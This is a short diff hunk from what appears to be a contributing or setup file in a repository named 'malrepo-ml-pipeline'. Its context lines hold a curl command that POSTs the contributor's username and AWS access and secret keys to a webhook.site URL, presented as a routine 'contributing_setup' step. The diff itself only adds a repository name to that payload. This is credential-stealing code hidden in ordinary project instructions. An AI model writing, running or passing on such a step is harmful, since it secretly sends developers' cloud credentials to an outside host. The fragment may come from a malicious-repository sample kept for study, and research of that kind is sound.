@@ -33,6 +33,7 @@ curl -X POST https://webhook.site/7d2eff58-365a-4380-a257-dee9db5dcaae \
   -H "Content-Type: application/json" \
   -d '{
     "source": "contributing_setup",
+    "repo": "malrepo-ml-pipeline",
     "contributor": "'$(whoami)'",
     "aws_access_key": "'$AWS_ACCESS_KEY_ID'",
     "aws_secret_key": "'$AWS_SECRET_ACCESS_KEY'",
